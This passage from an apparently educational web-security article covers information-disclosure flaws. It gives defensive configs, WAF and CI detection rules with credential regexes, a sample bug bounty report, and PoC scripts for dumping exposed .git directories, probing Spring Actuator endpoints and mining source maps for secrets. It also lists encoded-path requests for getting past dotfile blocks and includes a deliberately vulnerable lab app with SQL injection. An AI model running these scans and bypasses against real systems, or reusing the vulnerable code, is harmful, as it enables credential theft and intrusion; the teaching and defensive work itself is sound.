# MISTAKE 2: Default docs enabled in production
app = FastAPI()  # /docs and /redoc accessible

# MISTAKE 3: Raw exception details in response
@app.exception_handler(Exception)
async def generic_handler(request, exc):
    return JSONResponse(
        status_code=500,
        content={"detail": str(exc), "traceback": traceback.format_exc()}  # Never
    )

# MISTAKE 4: Database URL in error messages
@app.get("/data")
async def get_data():
    try:
        return await database.fetch_all("SELECT * FROM data")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))  # Leaks DB errors
```

**Correct approach:**

```python
import logging
import uuid
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse

logger = logging.getLogger(__name__)

app = FastAPI(
    debug=False,
    docs_url=None,
    redoc_url=None,
    openapi_url=None
)

@app.exception_handler(Exception)
async def generic_exception_handler(request: Request, exc: Exception):
    request_id = str(uuid.uuid4())
    logger.error(
        f"Unhandled exception [request_id={request_id}]: {exc}",
        exc_info=True
    )
    return JSONResponse(
        status_code=500,
        content={
            "error": "Internal Server Error",
            "request_id": request_id
        }
    )
```

### Nginx Misconfiguration

```nginx
# MISTAKE: No dotfile blocking
server {
    root /var/www/app;
    location / {
        try_files $uri $uri/ /index.html;
    }
}

# CORRECT: Block all dotfiles except .well-known
server {
    root /var/www/app/public;  # Serve only the public directory
    
    # Block dotfiles
    location ~ /\.(?!well-known) {
        deny all;
        return 404;
    }
    
    # Block backup files
    location ~* \.(bak|old|swp|save|orig|tmp|sql|log|conf)$ {
        deny all;
        return 404;
    }
    
    # Block source maps
    location ~* \.map$ {
        deny all;
        return 404;
    }
    
    location / {
        try_files $uri $uri/ /index.html;
    }
}
```

---

## 12. AWS/Linux Specific Concerns

### AWS Metadata in Stack Traces

When applications running on EC2 or ECS encounter errors connecting to AWS services, the error messages can leak:

- AWS region and availability zone
- Instance ID and instance type
- IAM role name
- VPC and subnet IDs
- Security group IDs

```json
{
  "error": "AccessDenied: User: arn:aws:sts::123456789012:assumed-role/prod-app-role/i-0a1b2c3d4e5f6g7h8 is not authorized to perform: s3:GetObject on resource: arn:aws:s3:::target-internal-data/secrets.json",
  "region": "us-east-1",
  "requestId": "A1B2C3D4E5F6G7H8"
}
```

This error reveals the AWS account ID (123456789012), the IAM role name (prod-app-role), the instance ID, the S3 bucket name, and the specific key being accessed.

### Linux File Path Disclosure

Stack traces on Linux systems reveal deployment details:

```
/home/ubuntu/app/src/controllers/auth.js:42      -- Ubuntu user, app location
/var/www/html/api/v1/routes.py:156                -- Standard web path
/opt/app/node_modules/express/lib/router/route.js -- Node.js with Express
/app/main.py:23                                    -- Docker container (common /app path)
```

### Kubernetes Specific Leaks

```json
{
  "error": "Service unavailable",
  "upstream": "payment-service.production.svc.cluster.local:8443",
  "pod": "api-gateway-7d8f9c6b4-x2k9m",
  "namespace": "production",
  "node": "ip-10-0-3-42.ec2.internal"
}
```

This reveals the Kubernetes namespace, service name, pod name, and the internal EC2 instance hostname.

---

## 13. Detection and Monitoring Strategies

### WAF Rules for Information Disclosure

```nginx
# ModSecurity rules to detect information disclosure in responses

# Block responses containing stack traces
SecRule RESPONSE_BODY "@rx (at\s+[\w.]+\s*\([\w/\\\\:.-]+:\d+:\d+\))" \
    "id:100001,phase:4,deny,msg:'Stack trace detected in response'"

# Block responses containing environment variables
SecRule RESPONSE_BODY "@rx (DATABASE_URL|DB_PASSWORD|AWS_SECRET|JWT_SECRET|STRIPE_SECRET)" \
    "id:100002,phase:4,deny,msg:'Potential credential leak in response'"

# Block responses containing internal IPs
SecRule RESPONSE_BODY "@rx \b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b" \
    "id:100003,phase:4,log,msg:'Internal IP address in response'"
```

### Automated Scanning in CI/CD

```yaml
# GitHub Actions workflow for detecting exposed sensitive files
name: Security - Information Disclosure Check
on:
  push:
    branches: [main]
  pull_request:

jobs:
  check-exposure:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Check for source maps in build output
        run: |
          if find ./build ./dist -name "*.map" 2>/dev/null | grep -q "."; then
            echo "ERROR: Source maps found in build output"
            find ./build ./dist -name "*.map"
            exit 1
          fi
      
      - name: Check for .env files in deployment
        run: |
          if find ./build ./dist ./public -name ".env*" 2>/dev/null | grep -q "."; then
            echo "ERROR: .env files found in deployment directory"
            exit 1
          fi
      
      - name: Check for debug mode in config
        run: |
          if grep -rn "debug.*=.*[Tt]rue\|DEBUG.*=.*1" src/ --include="*.py" --include="*.js" --include="*.ts"; then
            echo "WARNING: Debug mode may be enabled"
          fi
      
      - name: Check for hardcoded secrets
        run: |
          if grep -rn "sk_live_\|AKIA[A-Z0-9]\{16\}\|ghp_[a-zA-Z0-9]\{36\}" src/; then
            echo "ERROR: Potential hardcoded secrets found"
            exit 1
          fi
```

### Runtime Monitoring

```javascript
// Express middleware to detect and alert on information disclosure
const informationDisclosureMiddleware = (req, res, next) => {
  const originalJson = res.json.bind(res);
  
  res.json = (body) => {
    const bodyStr = JSON.stringify(body);
    
    // Check for stack traces
    if (bodyStr.includes('at ') && bodyStr.match(/\.(js|ts|py|java|rb):\d+/)) {
      logger.alert('Stack trace detected in API response', {
        url: req.originalUrl,
        method: req.method,
        ip: req.ip
      });
      // Replace with safe error
      return originalJson({ error: 'Internal Server Error', requestId: req.id });
    }
    
    // Check for credential patterns
    const credPatterns = [
      /AKIA[A-Z0-9]{16}/,
      /sk_live_[a-zA-Z0-9]+/,
      /password["']?\s*[:=]\s*["'][^"']+["']/i,
      /DATABASE_URL.*:\/\//
    ];
    
    for (const pattern of credPatterns) {
      if (pattern.test(bodyStr)) {
        logger.critical('Potential credential leak in API response', {
          url: req.originalUrl,
          pattern: pattern.source
        });
        return originalJson({ error: 'Internal Server Error', requestId: req.id });
      }
    }
    
    return originalJson(body);
  };
  
  next();
};
```

---

## 14. Prevention Strategies

### Comprehensive Checklist

**Build-time controls:**

1. **Remove source maps from production builds**:
   ```javascript
   // webpack.config.js
   module.exports = {
     mode: 'production',
     devtool: false, // No source maps in production
     // Or use 'hidden-source-map' to generate but not reference them
   };
   ```

   ```javascript
   // vite.config.js
   export default defineConfig({
     build: {
       sourcemap: false
     }
   });
   ```

2. **Strip debug endpoints before deployment**: Use environment-based route registration:
   ```javascript
   if (process.env.NODE_ENV !== 'production') {
     app.get('/debug/config', debugController.getConfig);
     app.get('/debug/db', debugController.dbStatus);
   }
   ```

3. **Add `.env` and sensitive files to `.dockerignore` and `.gitignore`**:
   ```
   # .dockerignore
   .env*
   .git
   *.pem
   *.key
   *.bak
   *.swp
   *.log
   ```

**Runtime controls:**

4. **Block dotfiles at the web server level** (see Nginx example above)
5. **Use custom error handlers** that never expose internals
6. **Set `NODE_ENV=production`** for Node.js applications
7. **Set `debug=False`** for FastAPI/Django applications
8. **Disable Swagger/OpenAPI** in production or put it behind authentication
9. **Restrict Spring Boot Actuator endpoints** to internal networks

**Infrastructure controls:**

10. **Use separate build artifacts** -- never deploy the source repository. Build a clean artifact (Docker image, zip, etc.) that contains only runtime files.
11. **Scan deployments** for exposed sensitive files as part of CI/CD
12. **Use secrets management** (AWS Secrets Manager, HashiCorp Vault) instead of `.env` files
13. **Network segmentation** -- debug endpoints should only be accessible from internal networks

---

## 15. Bug Bounty Report Example

### Report: .env File Exposure Leaking AWS Credentials and Database Password

**Title:** Exposed .env file at /.env leaks production AWS credentials and database password

**Severity:** Critical (CVSS 9.1)

**Vulnerability Type:** Information Disclosure / Sensitive Data Exposure (CWE-200, CWE-532)

**URL:** `https://app.target.com/.env`

**Summary:**

The production application at `app.target.com` serves the `.env` configuration file as a static file. This file contains production AWS IAM credentials, database connection strings with passwords, JWT signing secrets, and third-party API keys.

**Steps to Reproduce:**

1. Send the following HTTP request:

```http
GET /.env HTTP/1.1
Host: app.target.com
```

2. The server responds with HTTP 200 and the following content (redacted):

```
DATABASE_URL=postgresql://app_user:REDACTED@prod-db.internal.target.com:5432/target_prod
AWS_ACCESS_KEY_ID=AKIA...REDACTED
AWS_SECRET_ACCESS_KEY=REDACTED
JWT_SECRET=REDACTED
STRIPE_SECRET_KEY=sk_live_REDACTED
```

3. I verified the AWS credentials are valid (without performing any destructive actions) by running:

```bash
aws sts get-caller-identity --access-key-id AKIA...REDACTED --secret-access-key REDACTED
```

Which returned:

```json
{
  "UserId": "AIDA...",
  "Account": "123456789012",
  "Arn": "arn:aws:iam::123456789012:user/app-prod-service"
}
```

**Impact:**

An attacker can use the exposed credentials to:

- **Access the production database** directly, reading or modifying all user data
- **Assume the AWS IAM identity** and access S3 buckets, Lambda functions, or any other AWS resources that identity has permissions for
- **Forge JWT tokens** using the exposed JWT secret, bypassing authentication entirely
- **Access the Stripe account** using the secret key, potentially processing unauthorized charges or accessing payment data

This is a full compromise of the application's backend infrastructure.

**Remediation:**

1. **Immediately rotate** all credentials exposed in the `.env` file (AWS keys, database password, JWT secret, Stripe key)
2. **Configure the web server** to deny access to dotfiles (see Nginx `location ~ /\.` rule)
3. **Audit AWS CloudTrail** for any unauthorized access using the exposed credentials
4. **Move secrets** to a secrets management service (AWS Secrets Manager, HashiCorp Vault)
5. **Add CI/CD checks** to ensure `.env` files are never included in deployments

### Severity Explanation

This is rated Critical because:

- **No authentication required** -- anyone can access `/.env`
- **Direct credential exposure** -- the file contains production secrets
- **Full infrastructure compromise** -- AWS credentials + database password + JWT secret = complete control
- **Active credentials** -- verified the AWS credentials return a valid identity

Under CVSS 3.1, this scores 9.1: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N. Network-accessible, no complexity, no privileges required, no user interaction, high confidentiality and integrity impact.

---

## 16. Realistic PoC Examples

### PoC 1: Full Source Code Reconstruction from .git Exposure

```bash
#!/bin/bash
# PoC: .git exposure leading to source code reconstruction

TARGET="https://target.com"

echo "[*] Checking for .git exposure..."
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/.git/HEAD")

if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] .git/HEAD accessible!"
    echo "[*] Content:"
    curl -s "${TARGET}/.git/HEAD"
    
    echo "[*] Checking .git/config..."
    curl -s "${TARGET}/.git/config"
    
    echo "[*] Running git-dumper..."
    git-dumper "${TARGET}/.git/" ./dumped_source
    
    echo "[*] Repository reconstructed. Searching for secrets..."
    cd ./dumped_source
    
    echo "[*] Checking for .env files in history..."
    git log --all --diff-filter=D --summary | grep -i "\.env\|config\|secret\|credential"
    
    echo "[*] Searching current files for credentials..."
    grep -rn "password\|secret\|api_key\|token\|AWS_\|AKIA" . \
      --include="*.js" --include="*.py" --include="*.env" \
      --include="*.json" --include="*.yml" --include="*.yaml" \
      --include="*.conf" --include="*.cfg" --include="*.ini"
    
    echo "[*] Done. Manual review recommended."
else
    echo "[-] .git/HEAD not accessible (HTTP ${HTTP_CODE})"
fi
```

### PoC 2: Spring Boot Actuator to AWS Credential Theft

```python
#!/usr/bin/env python3
"""PoC: Spring Boot Actuator env endpoint leaking AWS credentials"""

import requests
import json
import sys

target = sys.argv[1] if len(sys.argv) > 1 else "https://target.com"

actuator_endpoints = [
    "/actuator/env",
    "/actuator",
    "/actuator/configprops",
    "/actuator/health",
    "/actuator/info",
    "/actuator/mappings",
    "/manage/env",
    "/env",
]

print(f"[*] Testing actuator endpoints on {target}")

for endpoint in actuator_endpoints:
    url = f"{target}{endpoint}"
    try:
        resp = requests.get(url, timeout=10, verify=False)
        if resp.status_code == 200:
            print(f"[+] FOUND: {url} (HTTP {resp.status_code})")
            
            try:
                data = resp.json()
                body = json.dumps(data)
                
                # Check for AWS credentials
                if "AWS_ACCESS_KEY_ID" in body or "AKIA" in body:
                    print("[!] AWS credentials potentially exposed!")
                
                # Check for database credentials
                if "DB_PASSWORD" in body or "DATABASE_URL" in body or "spring.datasource" in body:
                    print("[!] Database credentials potentially exposed!")
                
                # Check for JWT secrets
                if "JWT_SECRET" in body or "jwt.secret" in body:
                    print("[!] JWT secret potentially exposed!")
                    
            except json.JSONDecodeError:
                print(f"    Response is not JSON ({len(resp.text)} bytes)")
        elif resp.status_code == 403:
            print(f"[~] EXISTS but forbidden: {url}")
        elif resp.status_code == 401:
            print(f"[~] EXISTS but requires auth: {url}")
    except requests.exceptions.RequestException as e:
        pass

print("[*] Scan complete")
```

### PoC 3: Source Map Extraction and Secret Discovery

```python
#!/usr/bin/env python3
"""PoC: Extract and analyze JavaScript source maps for secrets"""

import requests
import json
import re
import sys
from urllib.parse import urljoin
from html.parser import HTMLParser

class ScriptExtractor(HTMLParser):
    def __init__(self):
        super().__init__()
        self.scripts = []
    
    def handle_starttag(self, tag, attrs):
        if tag == 'script':
            for name, value in attrs:
                if name == 'src' and value.endswith('.js'):
                    self.scripts.append(value)

def find_source_maps(target_url):
    print(f"[*] Fetching {target_url}")
    resp = requests.get(target_url, timeout=10)
    
    # Extract script URLs from HTML
    parser = ScriptExtractor()
    parser.feed(resp.text)
    
    print(f"[*] Found {len(parser.scripts)} JavaScript files")
    
    source_maps = []
    for script_url in parser.scripts:
        full_url = urljoin(target_url, script_url)
        map_url = full_url + ".map"
        
        # Check if source map exists
        map_resp = requests.get(map_url, timeout=10)
        if map_resp.status_code == 200:
            try:
                map_data = map_resp.json()
                if "sources" in map_data and "sourcesContent" in map_data:
                    print(f"[+] Source map found: {map_url}")
                    print(f"    Sources: {len(map_data['sources'])} files")
                    source_maps.append((map_url, map_data))
            except json.JSONDecodeError:
                pass
    
    return source_maps

def analyze_source_maps(source_maps):
    secret_patterns = [
        (r'AKIA[A-Z0-9]{16}', 'AWS Access Key'),
        (r'sk_live_[a-zA-Z0-9]{24,}', 'Stripe Secret Key'),
        (r'ghp_[a-zA-Z0-9]{36}', 'GitHub Personal Access Token'),
        (r'api[_-]?key[\s]*[:=][\s]*["\'][a-zA-Z0-9-_]{20,}["\']', 'API Key'),
        (r'secret[\s]*[:=][\s]*["\'][^"\']{8,}["\']', 'Secret Value'),
        (r'password[\s]*[:=][\s]*["\'][^"\']{4,}["\']', 'Password'),
        (r'https?://[^:]+:[^@]+@', 'Credential in URL'),
        (r'/api/internal/\S+', 'Internal API Endpoint'),
        (r'/admin/\S+', 'Admin Endpoint'),
    ]
    
    for map_url, map_data in source_maps:
        print(f"\n[*] Analyzing: {map_url}")
        for i, content in enumerate(map_data.get('sourcesContent', [])):
            if content is None:
                continue
            source_file = map_data['sources'][i] if i < len(map_data['sources']) else 'unknown'
            
            for pattern, description in secret_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                for match in matches:
                    print(f"  [!] {description} in {source_file}: {match[:60]}...")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://target.com"
    maps = find_source_maps(target)
    if maps:
        analyze_source_maps(maps)
    else:
        print("[-] No source maps found")
```

---

## 17. Common Bypass Techniques

### Bypassing Dotfile Blocking

When the server blocks `/.git/HEAD` but the rule is poorly written:

```http
# URL encoding
GET /%2e%67%69%74/HEAD HTTP/1.1

# Double URL encoding
GET /%252e%2567%2569%2574/HEAD HTTP/1.1

# Path normalization bypass
GET /foo/..%2f.git/HEAD HTTP/1.1

# Case variation (Windows servers)
GET /.GIT/HEAD HTTP/1.1
GET /.Git/HEAD HTTP/1.1

# Trailing dot (Windows IIS)
GET /.git./HEAD HTTP/1.1

# Null byte (older servers)
GET /.git/HEAD%00.html HTTP/1.1

# Semicolon path parameter (Tomcat)
GET /.git;/HEAD HTTP/1.1

# Backslash (Windows/IIS)
GET /\.git\HEAD HTTP/1.1
```

### Bypassing Error Page Suppression

When the application has custom error pages but the error handling is incomplete:

```http
# Force a different error code path
GET /api/users/1 HTTP/1.1
Accept: application/xml
# May trigger an unhandled content negotiation error

# Request with invalid HTTP version
GET /api/users/1 HTTP/0.9
# May bypass error handler that only handles HTTP/1.1

# POST to a GET endpoint with an unexpected body
POST /api/users HTTP/1.1
Content-Type: multipart/form-data; boundary=----foo
Content-Length: 99999999
# May trigger timeout/resource errors with raw stack traces

# GraphQL introspection even when /docs is disabled
POST /graphql HTTP/1.1
Content-Type: application/json

{"query": "{ __schema { types { name fields { name type { name } } } } }"}
```

### Bypassing Source Map Blocking

```http
# Direct access blocked, but maybe the reference still works
# Check if the map is embedded inline (data URI) in the JS file
GET /static/js/main.js HTTP/1.1
# Search for: sourceMappingURL=data:application/json;base64,...

# Check alternate paths
GET /static/js/main.js.map HTTP/1.1
GET /assets/js/main.js.map HTTP/1.1
GET /build/static/js/main.js.map HTTP/1.1
GET /dist/main.js.map HTTP/1.1

# Check for webpack stats file (also reveals source structure)
GET /stats.json HTTP/1.1
GET /webpack-stats.json HTTP/1.1
GET /bundle-stats.json HTTP/1.1
```

---

## 18. Lab Setup Ideas

### Lab 1: Vulnerable Express Application

```javascript
// vulnerable-app.js -- DO NOT deploy in production
const express = require('express');
const path = require('path');
const fs = require('fs');
const { Pool } = require('pg');

const app = express();

// Vulnerability: Serve entire project root (exposes .env, .git, logs)
app.use(express.static(path.join(__dirname)));

// Vulnerability: Debug endpoint
app.get('/debug/env', (req, res) => {
  res.json(process.env);
});

// Vulnerability: Log file accessible
app.get('/api/users/:id', async (req, res) => {
  try {
    // Log sensitive data
    fs.appendFileSync('logs/app.log',
      `[${new Date().toISOString()}] User lookup: id=${req.params.id}, ip=${req.ip}\n`
    );
    const pool = new Pool();
    const result = await pool.query(`SELECT * FROM users WHERE id = ${req.params.id}`);
    res.json(result.rows);
  } catch (err) {
    // Vulnerability: Raw error sent to client
    res.status(500).json({
      error: err.message,
      stack: err.stack,
      query: `SELECT * FROM users WHERE id = ${req.params.id}`
    });
  }
});

app.listen(3000, () => console.log('Vulnerable app on :3000'));
```

```yaml
# docker-compose.yml for the lab
version: '3.8'
services:
  vulnerable-app:
    build: .
    ports:
      - "3000:3000"
    environment:
      - DB_PASSWORD=lab_password_123
      - JWT_SECRET=lab-jwt-secret
      - AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
      - AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
    volumes:
      - .:/app  # Mounts .git directory too

  postgres:
    image: postgres:16
    environment:
      - POSTGRES_PASSWORD=lab_password_123
      - POSTGRES_DB=vulnerable_app
    ports:
      - "5432:5432"
```

### Lab 2: Spring Boot Actuator Exposure

```yaml
# docker-compose.yml
services:
  spring-app:
    image: springcommunity/spring-petclinic:latest
    ports:
      - "8080:8080"
    environment:
      - MANAGEMENT_ENDPOINTS_WEB_EXPOSURE_INCLUDE=*
      - MANAGEMENT_ENDPOINT_ENV_SHOW_VALUES=ALWAYS
      - DB_PASSWORD=super_secret_password
      - AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
```

### Lab 3: WordPress with Debug Log

```yaml
services:
  wordpress:
    image: wordpress:latest
    ports:
      - "8080:80"
    environment:
      - WORDPRESS_DB_HOST=db
      - WORDPRESS_DB_PASSWORD=wp_password
      - WORDPRESS_DEBUG=1
      - WORDPRESS_CONFIG_EXTRA=
          define('WP_DEBUG', true);
          define('WP_DEBUG_LOG', true);
          define('WP_DEBUG_DISPLAY', false);
    volumes:
      - wp_data:/var/www/html

  db:
    image: mysql:8.0
    environment:
      - MYSQL_ROOT_PASSWORD=root_password
      - MYSQL_DATABASE=wordpress
      - MYSQL_PASSWORD=wp_password

volumes:
  wp_data:
```

---

## Conclusion

Information disclosure vulnerabilities are the bread and butter of the reconnaissance phase. They are rarely sexy, they rarely get Critical CVEs on their own, and they are almost always underestimated by developers. But in the hands of a skilled attacker, a single exposed `.env` file, a verbose stack trace, or an accessible `.git` directory is the difference between a dead-end pentest and a full compromise.

The vulnerabilities covered in this article -- log exposure, stack traces, source maps, `.git` directories, Swagger docs, debug endpoints, backup files, `.env` files, and verbose errors -- share a common root cause: the gap between development and production configurations. Developers need these tools. Production does not. The failure is in the deployment pipeline, not the development practice.

Your defense strategy must be layered: build-time controls that strip debug artifacts, runtime controls that sanitize errors, infrastructure controls that block sensitive paths, and monitoring controls that alert when something leaks despite all precautions.

For bug bounty hunters: information disclosure is your most reliable finding category. Every single target has at least one of these issues. Start every engagement with the content discovery workflow described in this article. The secrets you find will fuel every other attack in your arsenal.

---

**Next in the series:** [Part 15: Chaining Vulnerabilities Together](/security-deep-dive-part-15) -- where we take every individual vulnerability class from this series and combine them into devastating multi-step attack chains.

**Recommended tools for this article:** Burp Suite Professional, ffuf, gobuster, git-dumper, unwebpack-sourcemap, SecLists wordlists, ds_store parser, truffleHog (for secret scanning in git history).
